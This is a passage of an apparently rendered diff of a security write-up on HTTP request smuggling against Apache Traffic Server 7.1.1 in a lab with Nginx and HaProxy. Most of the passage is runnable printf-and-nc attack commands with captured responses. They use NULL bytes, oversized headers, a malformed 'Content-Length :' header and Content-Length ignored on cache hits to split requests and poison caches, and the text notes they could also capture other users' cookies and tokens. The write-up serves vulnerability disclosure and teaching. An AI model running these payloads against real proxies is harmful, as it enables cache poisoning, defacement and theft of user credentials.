+<span class="s1">&#39;X-Something: &quot;\0something&quot;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET http://dummy-host7.example.com/index.html?replacing=1&amp;zorg=2 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /targeted.html?replaced=maybe&amp;zorg=3 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007</code></pre></div>
+
+
+<p>This is just <strong>2 queries</strong> (1st one has 2 bad header, one with a NULL, one with a space in header name), for ATS it's <strong>3 queries</strong>.</p>
+
+<p>The regular second one (<code>/targeted.html</code>) -- third for ATS --  will get the response of the hidden query (<code>http://dummy-host.example.com/index.html?replacing=1&amp;zorg=2</code>). Check the <code>X-Location-echo:</code> added by Nginx. After that ATS adds a thirsr response, a 404, but the previous actor expects only 2 responses, and the second response <strong>is already replaced</strong>.</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">400</span> <span class="ne">Invalid HTTP Request</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:34:53 GMT</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-store</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">220</span>
+
+<span class="nt">&lt;HTML&gt;</span>
+<span class="nt">&lt;HEAD&gt;</span>
+<span class="nt">&lt;TITLE&gt;</span>Bad Request<span class="nt">&lt;/TITLE&gt;</span>
+<span class="nt">&lt;/HEAD&gt;</span>
+
+<span class="nt">&lt;BODY</span> <span class="na">BGCOLOR=</span><span class="s">&quot;white&quot;</span> <span class="na">FGCOLOR=</span><span class="s">&quot;black&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;H1&gt;</span>Bad Request<span class="nt">&lt;/H1&gt;</span>
+<span class="nt">&lt;HR&gt;</span>
+
+<span class="nt">&lt;FONT</span> <span class="na">FACE=</span><span class="s">&quot;Helvetica,Arial&quot;</span><span class="nt">&gt;&lt;B&gt;</span>
+Description: Could not process this request. 
+<span class="nt">&lt;/B&gt;&lt;/FONT&gt;</span>
+<span class="nt">&lt;HR&gt;</span>
+<span class="nt">&lt;/BODY&gt;</span></code></pre></div>
+
+
+<p>Then:</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:34:53 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 14:16:28 GMT</span>
+<span class="na">ETag</span><span class="o">:</span> <span class="l">&quot;5bd321bc-78&quot;</span>
+<span class="na">X-Location-echo</span><span class="o">:</span> <span class="l">/index.html?replacing=1&amp;zorg=2</span>
+<span class="na">X-Default-VH</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=300</span>
+<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
+<span class="na">Age</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+
+$<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Nginx default static page<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Hello World<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>It works!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+<p>And then the extra unused response:</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">404</span> <span class="ne">Not Found</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:34:53 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">153</span>
+<span class="na">Age</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;&lt;title&gt;</span>404 Not Found<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;center&gt;&lt;h1&gt;</span>404 Not Found<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
+<span class="nt">&lt;hr&gt;&lt;center&gt;</span>nginx/1.15.5<span class="nt">&lt;/center&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></div>
+
+
+<p>If you try to use port 8001 (so transit via HaProxy) you will not get the expected attacking result. That attacking query is really too bad.</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.0</span> <span class="m">400</span> <span class="ne">Bad request</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+
+<span class="nt">&lt;html&gt;&lt;body&gt;&lt;h1&gt;</span>400 Bad request<span class="nt">&lt;/h1&gt;</span>
+Your browser sent an invalid request.
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+<p>That's an HTTP request splitting attack, but real world usage may be hard to find.</p>
+
+<p>The fix on ATS is the 'close on error', when an error 400 is triggered the pipelined is stopped, the socket is closed after the error.</p>
+
+<h2>Request Splitting using Huge Header, Early End-Of-Query</h2>
+
+<p>This attack is almost the same as the previous one, but do not need the magical <strong>NULL</strong> character to trigger the end-of-query event.</p>
+
+<p>By using headers with a size around <strong>65536 characters</strong> we can trigger this event, and exploit it the same way than the with the NULL premature end of query.</p>
+
+<p>A note on printf huge header generation with <code>printf</code>. Here I'm generating a query with one header containing a lot of repeated characters (<code>=</code> or <code>1</code> for example):</p>
+
+<pre><code>X: ==============( 65 532 '=' )========================\r\n
+</code></pre>
+
+<p>You can use the <code>%ns</code> form in printf to generate this, generating big number of spaces.</p>
+
+<p>But to do that we need to replace some special characters with tr and use <code>_</code> instead of spaces in the original string:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;X:_&quot;%65532s&quot;\r\n&#39;</span> <span class="p">|</span> tr <span class="s2">&quot; &quot;</span> <span class="s2">&quot;=&quot;</span> <span class="p">|</span> tr <span class="s2">&quot;_&quot;</span> <span class="s2">&quot; &quot;</span></code></pre></div>
+
+
+<p>Try it against Nginx :</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET_/something.html?zorg=6_HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:_dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;X:_&quot;%65532s&quot;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>tr <span class="s2">&quot; &quot;</span> <span class="s2">&quot;1&quot;</span><span class="se">\</span>
+<span class="p">|</span>tr <span class="s2">&quot;_&quot;</span> <span class="s2">&quot; &quot;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8002</code></pre></div>
+
+
+<p>I gat one error 400, that's the normal stuff. It Nginx does not like huge headers.</p>
+
+<p>Now try it against ATS7:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET_/something.html?zorg2=5_HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host:_dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;X:_&quot;%65534s&quot;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>tr <span class="s2">&quot; &quot;</span> <span class="s2">&quot;1&quot;</span><span class="se">\</span>
+<span class="p">|</span>tr <span class="s2">&quot;_&quot;</span> <span class="s2">&quot; &quot;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007</code></pre></div>
+
+
+<p>And after the error 400 we have a <strong>200 OK</strong> response. Same problem as in the previous example, and same fix. Here we still have a query with a bad header containing a space, and also one quite big header but we do not have the NULL character. But, yeah, 65000 character is very big, most actors would reject a query after 8000 characters on one line.</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">400</span> <span class="ne">Invalid HTTP Request</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:40:17 GMT</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-store</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">220</span>
+
+<span class="nt">&lt;HTML&gt;</span>
+<span class="nt">&lt;HEAD&gt;</span>
+<span class="nt">&lt;TITLE&gt;</span>Bad Request<span class="nt">&lt;/TITLE&gt;</span>
+<span class="nt">&lt;/HEAD&gt;</span>
+
+<span class="nt">&lt;BODY</span> <span class="na">BGCOLOR=</span><span class="s">&quot;white&quot;</span> <span class="na">FGCOLOR=</span><span class="s">&quot;black&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;H1&gt;</span>Bad Request<span class="nt">&lt;/H1&gt;</span>
+<span class="nt">&lt;HR&gt;</span>
+
+<span class="nt">&lt;FONT</span> <span class="na">FACE=</span><span class="s">&quot;Helvetica,Arial&quot;</span><span class="nt">&gt;&lt;B&gt;</span>
+Description: Could not process this request. 
+<span class="nt">&lt;/B&gt;&lt;/FONT&gt;</span>
+<span class="nt">&lt;HR&gt;</span>
+<span class="nt">&lt;/BODY&gt;</span></code></pre></div>
+
+
+
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 15:40:17 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 14:16:28 GMT</span>
+<span class="na">ETag</span><span class="o">:</span> <span class="l">&quot;5bd321bc-78&quot;</span>
+<span class="na">X-Location-echo</span><span class="o">:</span> <span class="l">/index.html?replaced=0&amp;cache=8</span>
+<span class="na">X-Default-VH</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=300</span>
+<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
+<span class="na">Age</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+
+$<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Nginx default static page<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Hello World<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>It works!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+<h2>Cache Poisoning using Incomplete Queries and Bad Separator Prefix</h2>
+
+<p><strong>Cache poisoning</strong>, that's sound great. On smuggling attacks you should only have to trigger a request or response splitting attack to prove a defect, but when you push that to cache poisoning people usually understand better why splitted pipelines are dangerous.</p>
+
+<p>ATS support an invalid header Syntax:</p>
+
+<pre><code>HEADER[SPACE]:HEADER VALUE\r\n
+</code></pre>
+
+<p>That's not conform to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.2">RFC7230 section 3.3.2</a>:</p>
+
+<blockquote><p>Each header field consists of a case-insensitive field name followed
+by a colon (":"), optional leading whitespace, the field value, and
+optional trailing whitespace.</p></blockquote>
+
+<p>So :</p>
+
+<pre><code>HEADER:HEADER_VALUE\r\n =&gt; OK
+HEADER:[SPACE]HEADER_VALUE\r\n =&gt; OK
+HEADER:[SPACE]HEADER_VALUE[SPACE]\r\n =&gt; OK
+HEADER[SPACE]:HEADER_VALUE\r\n =&gt; NOT OK
+</code></pre>
+
+<p>And <a href="https://tools.ietf.org/html/rfc7230#section-3.2.4">RFC7230 section 3.2.4</a> adds (bold added):</p>
+
+<blockquote><p><strong>No whitespace is allowed between the header field-name and colon</strong>.  In
+the past, differences in the handling of such whitespace have led to
+security vulnerabilities in request routing and response handling.  A
+server MUST reject any received request message that contains
+whitespace between a header field-name and colon with a response code
+of 400 (Bad Request). A proxy MUST remove any such whitespace from a
+response message before forwarding the message downstream.</p></blockquote>
+
+<p>ATS will interpret the bad header, and also forward it without alterations.</p>
+
+<p>Using this flaw we can add some headers in our request that are <strong>invalid</strong> for any
+valid HTTP agents but still interpreted by ATS like:</p>
+
+<pre><code>Content-Length :77\r\n
+</code></pre>
+
+<p>Or (try it as an exercise)</p>
+
+<pre><code>Transfer-encoding :chunked\r\n
+</code></pre>
+
+<p>Some HTTP servers will effectively reject such message with an error 400.
+But some will simply <em>ignore</em> the invalid header. That's the case of Nginx for example.</p>
+
+<p>ATS will maintain a keep-alive connection to the Nginx Backend, so we'll use this ignored header to transmit <strong>a body</strong> (ATS think it's a body) that is in fact <strong>a new query</strong> for the backend. And we'll make this query incomplete (missing a crlf
+on end-of-header) to absorb a future query sent to Nginx. This sort of incomplete-query filled by the next coming query is also a basic Smuggling technique demonstrated 13 years ago.</p>
+
+<pre><code>01 GET /does-not-exists.html?cache=x HTTP/1.1\r\n
+02 Host: dummy-host7.example.com\r\n
+03 Cache-Control: max-age=200\r\n
+04 X-info: evil 1.5 query, bad CL header\r\n
+05 Content-Length :117\r\n
+06 \r\n
+07 GET /index.html?INJECTED=1 HTTP/1.1\r\n
+08 Host: dummy-host7.example.com\r\n
+09 X-info: evil poisoning query\r\n
+10 Dummy-incomplete:
+</code></pre>
+
+<ul>
+<li>Line <strong>05</strong> is invalid (' :'). But for ATS it is valid.</li>
+<li>Lines <strong>07/08/09/10</strong> are just binary body data for ATS transmitted to backend.</li>
+</ul>
+
+
+<p>For Nginx:</p>
+
+<ul>
+<li>Line <strong>05</strong> is ignored.</li>
+<li>Line <strong>07</strong> is a new request (and first response is returned).</li>
+<li>Line <strong>10</strong> has no "\r\n". so Nginx is still waiting for the end of this query, on the keep-alive connection opened by ATS ...</li>
+</ul>
+
+
+<h3>Attack schema</h3>
+
+<pre><code>[ATS Cache poisoning - space before header separator + backend ignoring bad headers]
+Innocent        Attacker           ATS            Nginx
+    |               |               |               |
+    |               |--A(1A+1/2B)--&gt;|               | * Issue 1 &amp; 2 *
+    |               |               |--A(1A+1/2B)--&gt;| * Issue 3 *
+    |               |               |&lt;-A(404)-------|
+    |               |               |            [1/2B]
+    |               |&lt;-A(404)-------|            [1/2B]
+    |               |--C-----------&gt;|            [1/2B]
+    |               |               |--C-----------&gt;| * ending B *
+    |               |            [*CP*]&lt;--B(200)----|
+    |               |&lt;--B(200)------|               |
+    |--C---------------------------&gt;|               |
+    |&lt;--B(200)--------------------[HIT]             |
+</code></pre>
+
+<ul>
+<li>1A + 1/2B means request A + an incomplete query B</li>
+<li>A(X) : means X query is hidden in body of query A</li>
+<li>CP : Cache poisoning</li>
+<li>Issue 1 : ATS transmit 'header[SPACE]: Value', a bad HTTP header.</li>
+<li>Issue 2 : ATS interpret this bad header as valid (so 1/2B still hidden in body)</li>
+<li>Issue 3 : Nginx encounter the bad header but ignore the header instead of
+          sending an error 400. So 1/2B is discovered as a new query (no Content-length)
+          request B contains an incomplete header (no crlf)</li>
+<li>ending B: the 1st line of query C ends the incomplete header of query B.
+          all others headers are added to the query. C disappears and mix C
+          HTTP credentials with all previous B headers (cookie/bearer token/Host, etc.)</li>
+</ul>
+
+
+<p>Instead of cache poisoning you could also play with the incomplete <code>1/B</code> query and wait for the Innocent query to finish this request with HTTP credentials of this user (cookies, HTTP Auth, JWT tokens, etc.). That would be another attack vector. Here we will <em>simply</em> demonstrate cache poisoning.</p>
+
+<p>Run this attack:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="o">{</span>1..9<span class="o">}</span> <span class="p">;</span><span class="k">do</span>
+<span class="nb">printf</span> <span class="s1">&#39;GET /does-not-exists.html?cache=&#39;</span><span class="nv">$i</span><span class="s1">&#39; HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Cache-Control: max-age=200\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;X-info: evil 1.5 query, bad CL header\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Content-Length :117\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /index.html?INJECTED=&#39;</span><span class="nv">$i</span><span class="s1">&#39; HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;X-info: evil poisoning query\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Dummy-unterminated:&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007
+<span class="k">done</span></code></pre></div>
+
+
+<p>It should work, Nginx adds an X-Location-echo header in this lab configuration, where we have
+the first line of the query added on the response headers. This way we can observe that the second response is removing the real second query first line and replacing it with the hidden
+first line.</p>
+
+<p>On my case the last query response contained:</p>
+
+<pre><code> X-Location-echo: /index.html?INJECTED=3
+</code></pre>
+
+<p>But this last query was <code>GET /index.html?INJECTED=9</code>.</p>
+
+<p>You can check the cache content with:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="o">{</span>1..9<span class="o">}</span> <span class="p">;</span><span class="k">do</span>
+<span class="nb">printf</span> <span class="s1">&#39;GET /does-not-exists.html?cache=&#39;</span><span class="nv">$i</span><span class="s1">&#39; HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Cache-Control: max-age=200\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007
+<span class="k">done</span></code></pre></div>
+
+
+<p>In my case I found 6 404 (regular) and 3 200 responses (ouch), the cache <strong>is</strong> poisoned.</p>
+
+<p>If you want to go deeper in Smuggling understanding you should try to play with wireshark on this example. Do not forget to restart the cluster to empty the cache.</p>
+
+<p>Here we did not played with a C query yet, the cache poisoning occurs on our A query. Unless you consider the <code>/does-not-exists.html?cache='$i'</code> as C queries. But you can easily try to inject a C query on this cluster, where Nginx as some waiting requests, try to get it poisoned with <code>/index.html?INJECTED=3</code> responses:</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="k">for</span> i in <span class="o">{</span>1..9<span class="o">}</span> <span class="p">;</span><span class="k">do</span>
+<span class="nb">printf</span> <span class="s1">&#39;GET /innocent-C-query.html?cache=&#39;</span><span class="nv">$i</span><span class="s1">&#39; HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Cache-Control: max-age=200\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8007
+<span class="k">done</span></code></pre></div>
+
+
+<p>This may give you a touch on <em>real world</em> exploitations, you have to repeat the attack to obtain something. Vary the number of servers on the cluster, the pools settings on the various layers of reverse proxies, etc. Things get complex. The easiest attack is to be a <strong>chaos generator</strong> (defacement like or DOS), fine cache replacement of a target on the other hand requires fine study and a bit of luck.</p>
+
+<p>Does this work on port 8001 with HaProxy? well, no, of course. Our header syntax <strong>is invalid</strong>. You would need to hide the bad query syntax from HaProxy, maybe using another smuggling issue, to hide this bad request in a body. Or you would need a load balancer which does not detect this invalid syntax. Note that in this example the nginx behavior on invalid header syntax (ignore it) is also not standard (<a href="https://trac.nginx.org/nginx/ticket/1014">and wont be fixed, AFAIK</a>).</p>
+
+<p>This invalid space prefix problem is the same issue as Apache httpd in <a href="https://nvd.nist.gov/vuln/detail/CVE-2016-8743">CVE-2016-8743</a>.</p>
+
+<h2>HTTP Response Splitting: Content-Length Ignored on Cache Hit</h2>
+
+<p>Still there? Great! Because now is the nicest issue.</p>
+
+<p>At least for me it was the nicest issue. Mainly because I've spend a lot of time around it without understanding it.</p>
+
+<p>I was fuzzing ATS, and my fuzzer detected issues. Trying to reproduce I had failures, and success on previoulsy undetected issues, and back to step1. Issues you cannot reproduce, you start doubting that you saw it before. Suddenly you find it back, but then no, etc. And of course I was not searching the root cause on the right examples. I was for example triggering tests on bad chunked transmissions, or delayed chunks.</p>
+
+<p>It was very a long (too long) time before I detected that all this was linked to the <strong>cache hit/cache miss</strong> status of my requests.</p>
+
+<p><strong>On cache Hit Content-Length header on a GET query is not read.</strong></p>
+
+<p>That's so easy when you know it... And exploitation is also quite easy.</p>
+
+<p><em>We can hide a second query in the first query body, and on cache Hit this body becomes a new query.</em></p>
+
+<p>This sort of query will get one response first (and, yes, that's only one query), on a second launch it will render two responses (so an HTTP request Splitting by definition):</p>
+
+<pre><code>01 GET /index.html?cache=zorg42 HTTP/1.1\r\n
+02 Host: dummy-host7.example.com\r\n
+03 Cache-control: max-age=300\r\n
+04 Content-Length: 71\r\n
+05 \r\n
+06 GET /index.html?cache=zorg43 HTTP/1.1\r\n
+07 Host: dummy-host7.example.com\r\n
+08 \r\n
+</code></pre>
+
+<p>Line <strong>04</strong> is ignored on cache hit (only after the first run, then),
+after that line <strong>06</strong> is now a new query and not just the 1st query body.</p>
+
+<p>This HTTP query is valid, <strong>THERE IS NO invalid HTTP syntax present.</strong>
+So it's quite easy to perform a successful complete Smuggling attack from this issue, even using HaProxy in front of ATS.</p>
+
+<p>If HaProxy is configured to use a keep-alive connection to ATS we can fool the HTTP stream of HaProxy by sending a pipeline of two queries where ATS sees 3 queries:</p>
+
+<h3>Attack schema</h3>
+
+<pre><code>[ATS HTTP-Splitting issue on Cache hit + GET + Content-Length]
+Something        HaProxy           ATS            Nginx
+    |--A-----------&gt;|               |               |
+    |               |--A-----------&gt;|               |
+    |               |               |--A-----------&gt;|
+    |               |            [cache]&lt;--A--------|
+    |               | (etc.) &lt;------|               | warmup
+---------------------------------------------------------
+    |               |               |               | attack
+    |--A(+B)+C-----&gt;|               |               |
+    |               |--A(+B)+C-----&gt;|               |
+    |               |             [HIT]             | * Bug *
+    |               |&lt;--A-----------|               | * B 'discovered' *
+    |&lt;--A-----------|               |--B-----------&gt;|
+    |               |               |&lt;-B------------|
+    |               |&lt;-B------------|               |
+ [ouch]&lt;-B----------|               |               | * wrong resp. *
+    |               |               |--C-----------&gt;|
+    |               |               |&lt;--C-----------|
+    |              [R]&lt;--C----------|               | rejected
+</code></pre>
+
+<p>First, we need to init cache, we use port 8001 to get a stream HaProxy->ATS->Nginx.</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET /index.html?cache=cogip2000 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Cache-control: max-age=300\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Content-Length: 0\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8001</code></pre></div>
+
+
+<p>You can run it two times and see that on a second time it does not reach the nginx <code>access.log</code>.</p>
+
+<p>Then we attack HaProxy, or any other cache set in front of this HaProxy.
+We use a pipeline of <strong>2 queries</strong>, ATS will send back <strong>3 responses</strong>.
+If a keep-alive mode is present in front of ATS there is a security problem.
+Here it's the case because we do not use <code>option: http-close</code> on HaProxy (which would prevent usage of pipelines).</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">printf</span> <span class="s1">&#39;GET /index.html?cache=cogip2000 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Cache-control: max-age=300\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Content-Length: 74\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /index.html?evil=cogip2000 HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;GET /victim.html?cache=zorglub HTTP/1.1\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;Host: dummy-host7.example.com\r\n&#39;</span><span class="se">\</span>
+<span class="s1">&#39;\r\n&#39;</span><span class="se">\</span>
+<span class="p">|</span>nc -q <span class="m">1</span> 127.0.0.1 8001</code></pre></div>
+
+
+<p>Query for <code>/victim.html</code> (should be a 404 in our example) gets response for <code>/index.html</code> (<code>X-Location-echo: /index.html?evil=cogip2000</code>).</p>
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 16:05:41 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 14:16:28 GMT</span>
+<span class="na">ETag</span><span class="o">:</span> <span class="l">&quot;5bd321bc-78&quot;</span>
+<span class="na">X-Location-echo</span><span class="o">:</span> <span class="l">/index.html?cache=cogip2000</span>
+<span class="na">X-Default-VH</span><span class="o">:</span> <span class="l">0</span>
+<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=300</span>
+<span class="na">Accept-Ranges</span><span class="o">:</span> <span class="l">bytes</span>
+<span class="na">Age</span><span class="o">:</span> <span class="l">12</span>
+
+$<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Nginx default static page<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;h1&gt;</span>Hello World<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;p&gt;</span>It works!<span class="nt">&lt;/p&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span></code></pre></div>
+
+
+
+
+<div class="highlight"><pre><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="o">:</span> <span class="l">ATS/7.1.1</span>
+<span class="na">Date</span><span class="o">:</span> <span class="l">Fri, 26 Oct 2018 16:05:53 GMT</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html</span>
